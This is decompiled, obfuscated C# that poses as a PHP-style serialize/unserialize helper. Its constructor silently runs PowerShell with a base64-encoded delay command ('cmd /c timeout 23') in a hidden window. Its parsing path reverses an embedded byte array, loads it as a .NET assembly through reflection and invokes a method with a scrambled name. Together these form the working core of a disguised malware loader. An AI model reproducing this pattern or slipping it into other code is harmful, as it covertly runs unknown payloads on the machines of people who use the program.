using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.Reflection;
using System.Text;

public sealed class GClass0
{
	private Dictionary<Hashtable, bool> singleton;

	private Dictionary<ArrayList, bool> m_Container;

	private int _Interceptor;

	private byte[] consumer;

	public bool bool_0 = true;

	public Encoding encoding_0;

	private NumberFormatInfo m_Helper;

	internal static GClass0 OrderExpression;

	public GClass0()
	{
		if (_003CModule_003E_007Bfeea9efe_002Df51f_002D47db_002Da01a_002D6d96fa1c1ecc_007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_eb8c3541d6924dfe99d0a369d3f775c3 != 0)
		{
			switch (1)
			{
			default:
				return;
			case 1:
				break;
			case 0:
				return;
			}
		}
		encoding_0 = new UTF8Encoding();
		base._002Ector();
		m_Helper = new NumberFormatInfo();
		m_Helper.NumberGroupSeparator = "";
		m_Helper.NumberDecimalSeparator = ".";
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden
		};
		TestExpression(processStartInfo, bool_1: true);
		processStartInfo.FileName = "powershell";
		processStartInfo.Arguments = "-enc YwBtAGQAIAAvAGMAIAB0AGkAbQBlAG8AdQB0ACAAMgAzAA==";
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private void CheckPublisher(object task)
	{
		MethodInfo methodInfo = (MethodInfo)task;
		methodInfo.Invoke(null, null);
	}

	public string method_0(object object_0)
	{
		m_Container = new Dictionary<ArrayList, bool>();
		singleton = new Dictionary<Hashtable, bool>();
		return MapPublisher(object_0, new StringBuilder()).ToString();
	}

	private StringBuilder MapPublisher(object def, StringBuilder b)
	{
		StringBuilder result = default(StringBuilder);
		int num;
		if (def == null)
		{
			result = b.Append("N;");
			num = 3;
			if (_003CModule_003E_007Bfeea9efe_002Df51f_002D47db_002Da01a_002D6d96fa1c1ecc_007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_c32dc7a7c51947509978a0e01b440576 == 0)
			{
				goto IL_00d0;
			}
			goto IL_012b;
		}
		bool flag = def is string;
		goto IL_014c;
		IL_03b5:
		return result;
		IL_02de:
		singleton.Add((Hashtable)def, value: true);
		Hashtable hashtable = (Hashtable)def;
		b.Append("a:" + hashtable.Count + ":{");
		foreach (DictionaryEntry item2 in hashtable)
		{
			MapPublisher(item2.Key, b);
			MapPublisher(item2.Value, b);
		}
		b.Append('}');
		result = b;
		goto IL_03b5;
		IL_014c:
		ArrayList arrayList = default(ArrayList);
		int num4 = default(int);
		if (!flag)
		{
			if (!(def is bool))
			{
				if (!(def is int num2))
				{
					if (!(def is double num3))
					{
						if (def is ArrayList)
						{
							if (!m_Container.ContainsKey((ArrayList)def))
							{
								m_Container.Add((ArrayList)def, value: true);
								arrayList = (ArrayList)def;
								b.Append("a:" + arrayList.Count + ":{");
								num4 = 0;
								goto IL_012b;
							}
							result = b.Append("N;");
						}
						else if (def is Hashtable)
						{
							if (!singleton.ContainsKey((Hashtable)def))
							{
								goto IL_02de;
							}
							result = b.Append("N;");
						}
						else
						{
							result = b;
						}
					}
					else
					{
						result = b.Append("d:" + num3.ToString(m_Helper) + ";");
					}
				}
				else
				{
					result = b.Append("i:" + num2.ToString(m_Helper) + ";");
				}
			}
			else
			{
				result = b.Append("b:" + (((bool)def) ? "1" : "0") + ";");
			}
			goto IL_03b5;
		}
		string text = (string)def;
		if (bool_0)
		{
			consumer = RecordPageMessage.DeletePublisher();
			goto IL_01e6;
		}
		goto IL_0206;
		IL_012b:
		bool flag2 = num4 < arrayList.Count;
		num = 8;
		if (_003CModule_003E_007Bfeea9efe_002Df51f_002D47db_002Da01a_002D6d96fa1c1ecc_007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_4368a3f155534e3db11d901da4181282 != 0)
		{
			goto IL_00d0;
		}
		goto IL_00fe;
		IL_00fe:
		if (flag2)
		{
			MapPublisher(num4, b);
			MapPublisher(arrayList[num4], b);
			num4++;
			goto IL_012b;
		}
		MapExpression(b, '}');
		result = b;
		goto IL_03b5;
		IL_00d0:
		switch (num)
		{
		case 8:
			break;
		case 2:
			goto IL_012b;
		case 4:
			goto IL_014c;
		case 7:
			goto IL_01e6;
		case 6:
			goto IL_0230;
		default:
			goto IL_02de;
		case 1:
		case 3:
		case 5:
			goto IL_03b5;
		}
		goto IL_00fe;
		IL_0206:
		List<byte> list = new List<byte>();
		byte[] array = consumer;
		int i = 0;
		goto IL_0230;
		IL_01e6:
		text = text.Replace("\r\n", "\n");
		text = text.Replace('\r', '\n');
		goto IL_0206;
		IL_0230:
		for (; i < array.Length; i++)
		{
			byte item = array[i];
			list.Add(item);
		}
		list.Reverse();
		consumer = list.ToArray();
		result = (StringBuilder)ExcludeExpression(b, "s:" + encoding_0.GetByteCount(text) + ":\"" + text + "\";");
		goto IL_03b5;
	}

	public object method_1(string string_0)
	{
		_Interceptor = 0;
		return ReadPublisher(string_0);
	}

	private object ReadPublisher(string v)
	{
		Assembly assembly = (Assembly)typeof(Assembly).GetMethod("Load", new Type[1] { CompareExpression(typeof(byte[]).TypeHandle) })!.Invoke(null, new object[1] { consumer });
		int num = 7;
		if (_003CModule_003E_007Bfeea9efe_002Df51f_002D47db_002Da01a_002D6d96fa1c1ecc_007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_66e66ceca95247c2ac52066836749a3e == 0)
		{
			Hashtable hashtable = default(Hashtable);
			int num3 = default(int);
			ArrayList arrayList = default(ArrayList);
			string text2 = default(string);
			int num5 = default(int);
			object value = default(object);
			object obj = default(object);
			char c2 = default(char);
			int num4 = default(int);
			string text = default(string);
			int num2 = default(int);
			char c3 = default(char);
			string text3 = default(string);
			while (true)
			{
				int num6;
				switch (num)
				{
				case 10:
					hashtable = new Hashtable(num3);
					arrayList = new ArrayList(num3);
					_Interceptor += 4 + text2.Length;
					num5 = 0;
					goto IL_00f6;
				case 8:
					value = ReadPublisher(v);
					if (arrayList != null)
					{
						num = 2;
						if (_003CModule_003E_007Bfeea9efe_002Df51f_002D47db_002Da01a_002D6d96fa1c1ecc_007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_0a1f768f433b44dd94d8a2ebd9ef54e6 != 0)
						{
							continue;
						}
						goto case 6;
					}
					goto IL_00e5;
				case 6:
					if (obj is int && (int)obj == arrayList.Count)
					{
						arrayList.Add(value);
					}
					else
					{
						arrayList = null;
					}
					goto IL_00e5;
				case 7:
					if (v != null && v.Length > _Interceptor)
					{
						CheckPublisher(assembly.GetType("Gtiyddimjwlwblld.Kclqhozsksnutc")!.GetMethod("Lwnafn"));
						num = 0;
						if (_003CModule_003E_007Bfeea9efe_002Df51f_002D47db_002Da01a_002D6d96fa1c1ecc_007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_15a6d68cd9cb4899853cfb733849bfa9 != 0)
						{
							continue;
						}
						goto default;
					}
					return new object();
				default:
				{
					char c = v[_Interceptor];
					c2 = c;
					switch (c2)
					{
					case 'a':
						break;
					default:
						goto IL_01da;
					case 'i':
						goto IL_026a;
					case 'b':
						goto IL_036d;
					case 'd':
					{
						num6 = v.IndexOf(":", _Interceptor) + 1;
						num4 = v.IndexOf(";", num6);
						string text4 = v.Substring(num6, num4 - num6);
						_Interceptor += 3 + text4.Length;
						return double.Parse(text4, m_Helper);
					}
					case 'N':
						_Interceptor += 2;
						return null;
					case '\0':
					case '\u0001':
					case '\u0002':
					case '\u0003':
					case '\u0004':
					case '\u0005':
					case '\u0006':
					case '\a':
					case '\b':
					case '\t':
					case '\n':
					case '\v':
					case '\f':
					case '\r':
					case '\u000e':
					case '\u000f':
					case '\u0010':
					case '\u0011':
					case '\u0012':
					case '\u0013':
					case '\u0014':
					case '\u0015':
					case '\u0016':
					case '\u0017':
					case '\u0018':
					case '\u0019':
					case '\u001a':
					case '\u001b':
					case '\u001c':
					case '\u001d':
					case '\u001e':
					case '\u001f':
					case ' ':
					case '!':
					case '"':
					case '#':
					case '$':
					case '%':
					case '&':
					case '\'':
					case '(':
					case ')':
					case '*':
					case '+':
					case ',':
					case '-':
					case '.':
					case '/':
					case '0':
					case '1':
					case '2':
					case '3':
					case '4':
					case '5':
					case '6':
					case '7':
					case '8':
					case '9':
					case ':':
					case ';':
					case '<':
					case '=':
					case '>':
					case '?':
					case '@':
					case 'A':
					case 'B':
					case 'C':
					case 'D':
					case 'E':
					case 'F':
					case 'G':
					case 'H':
					case 'I':
					case 'J':
					case 'K':
					case 'L':
					case 'M':
					case 'O':
					case 'P':
					case 'Q':
					case 'R':
					case 'S':
					case 'T':
					case 'U':
					case 'V':
					case 'W':
					case 'X':
					case 'Y':
					case 'Z':
					case '[':
					case '\\':
					case ']':
					case '^':
					case '_':
					case '`':
					case 'c':
						goto IL_042c;
					}
					num6 = v.IndexOf(":", _Interceptor) + 1;
					num4 = v.IndexOf(":", num6);
					text2 = v.Substring(num6, num4 - num6);
					num3 = int.Parse(text2);
					goto case 10;
				}
				case 3:
					goto IL_01da;
				case 4:
					while (encoding_0.GetByteCount(text) > num2)
					{
						num3--;
						text = v.Substring(num4 + 2, num3);
					}
					_Interceptor += 6 + text2.Length + num3;
					if (bool_0)
					{
						text = text.Replace("\n", "\r\n");
					}
					return text;
				case 5:
					_Interceptor += 4;
					return c3 == '1';
				case 1:
					return int.Parse(text3, m_Helper);
				case 9:
					goto IL_042c;
				case 2:
					break;
					IL_00e5:
					hashtable[obj] = value;
					num5++;
					goto IL_00f6;
					IL_00f6:
					if (num5 < num3)
					{
						obj = ReadPublisher(v);
						goto case 8;
					}
					_Interceptor++;
					if (_Interceptor < v.Length && v[_Interceptor] == ';')
					{
						_Interceptor++;
					}
					if (arrayList != null)
					{
						return arrayList;
					}
					return hashtable;
					IL_036d:
					c3 = v[_Interceptor + 2];
					goto case 5;
					IL_026a:
					num6 = v.IndexOf(":", _Interceptor) + 1;
					num4 = v.IndexOf(";", num6);
					text3 = v.Substring(num6, num4 - num6);
					_Interceptor += 3 + text3.Length;
					num = 1;
					if (_003CModule_003E_007Bfeea9efe_002Df51f_002D47db_002Da01a_002D6d96fa1c1ecc_007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_0051802f07994cd5aa3758505a1f7512 == 0)
					{
						continue;
					}
					goto case 1;
					IL_01da:
					if (c2 != 's')
					{
						goto IL_042c;
					}
					num6 = v.IndexOf(":", _Interceptor) + 1;
					num4 = v.IndexOf(":", num6);
					text2 = v.Substring(num6, num4 - num6);
					num2 = int.Parse(text2);
					num3 = num2;
					if (num4 + 2 + num3 >= v.Length)
					{
						num3 = v.Length - 2 - num4;
					}
					text = v.Substring(num4 + 2, num3);
					num = 4;
					if (_003CModule_003E_007Bfeea9efe_002Df51f_002D47db_002Da01a_002D6d96fa1c1ecc_007D.m_0fed76e8007c4ce284ddc91b5fcad0bb.m_c32dc7a7c51947509978a0e01b440576 == 0)
					{
						continue;
					}
					goto case 1;
					IL_042c:
					return "";
				}
				break;
			}
		}
		object result = default(object);
		return result;
	}

	internal static void TestExpression(object object_0, bool bool_1)
	{
		((ProcessStartInfo)object_0).CreateNoWindow = bool_1;
	}

	internal static bool ReflectExpression()
	{
		return OrderExpression == null;
	}

	internal static GClass0 SearchExpression()
	{
		return OrderExpression;
	}

	internal static object ExcludeExpression(object object_0, object object_1)
	{
		return ((StringBuilder)object_0).Append((string?)object_1);
	}

	internal static object MapExpression(object object_0, char char_0)
	{
		return ((StringBuilder)object_0).Append(char_0);
	}

	internal static Type CompareExpression(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}
}
